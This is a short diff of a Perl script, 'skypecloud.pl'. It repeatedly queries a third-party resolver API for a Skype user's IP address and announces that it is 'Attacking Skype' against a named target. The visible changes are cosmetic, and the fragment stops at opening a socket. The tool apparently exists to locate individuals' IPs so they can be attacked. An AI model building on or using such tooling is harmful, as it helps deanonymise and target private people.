@@ -5,6 +5,7 @@ my $interval = $ARGV[1];
 my $domain   = "api.speedresolve.com";
 my $key      = "YOURKEYHERE";
 
+
 if ( $#ARGV != 1 ) {
     print "Usage: perl skypecloud.pl <skypename> <secondstocheck>\n";
     print "Made for www.speedresolve.com api\n";
@@ -12,7 +13,7 @@ if ( $#ARGV != 1 ) {
 }
 
 print
-"\nStarting SkypeCloud\nChecking for New IP every $interval seconds\nAttacking Skype: $skype\n**PRESS CNTL + Z TO CLOSE**\nAPIserv$
+"\nStarting SkypeCloud\nChecking for New IP every $interval seconds\nAttacking Skype: $skype\n**PRESS CNTL + Z TO CLOSE**\nAPIservice used, http://www.speedresolve.com/\n\n";
 while (1) {
     $socket = IO::Socket::INET->new(
         Proto    => 'tcp',
